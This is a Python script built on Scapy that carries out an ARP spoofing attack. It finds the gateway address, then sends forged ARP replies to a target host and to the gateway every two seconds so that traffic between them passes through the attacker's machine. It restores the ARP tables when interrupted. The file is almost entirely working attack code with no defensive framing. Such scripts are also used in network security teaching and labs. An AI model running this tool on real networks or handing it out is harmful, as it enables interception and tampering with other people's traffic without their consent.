from scapy.all import *
import time
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import send


class ARPSpoofing:
    def __init__(self):
        self.mac = "ff:ff:ff:ff:ff:ff"

    def get_mac(self, ip: str) -> str:
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst=self.mac)
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        return answered_list[0][1].hwsrc

    def spoof(self, target_ip: str, spoof_ip: str) -> None:
        pkt = ARP(op=2, pdst=target_ip, hwdst=self.get_mac(target_ip),
                  psrc=spoof_ip)
        send(pkt, verbose=False)

    def restore(self, destination_ip: str, source_ip: str):
        destination_mac = self.get_mac(destination_ip)
        source_mac = self.get_mac(source_ip)
        pkt = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
        send(pkt, verbose=False)


def get_gateway_ip_address() -> str:
    """
    this function returns the ip address of the gateway
    :return: the ip address of the gateway
    """
    return subprocess.Popen(["route -n get default | grep 'gateway' | awk '{print $2}'"],
                            stdout=subprocess.PIPE,
                            shell=True).stdout.read().decode().replace("\n", "")


def get_subnet_mask() -> str:
    return subprocess.Popen(["ifconfig -a| grep -w inet|awk '{print $6}'"],
                            stdout=subprocess.PIPE,
                            shell=True).stdout.read().decode().split('\n')[1]


def main() -> None:
    gateway_ip = get_gateway_ip_address()
    target_ip = ""
    spoofer = ARPSpoofing()
    try:

        sent_packets_count = 0
        while True:
            spoofer.spoof(target_ip, gateway_ip)
            spoofer.spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print("\r[*] Packets Sent " + str(sent_packets_count), end="")
            time.sleep(2)  # Waits for two seconds

    except KeyboardInterrupt:
        print("\nCtrl + C pressed.............Exiting")
        spoofer.restore(gateway_ip, target_ip)
        spoofer.restore(target_ip, gateway_ip)
        print("[+] Arp Spoof Stopped")
    print(get_subnet_mask())


if __name__ == "__main__":
    main()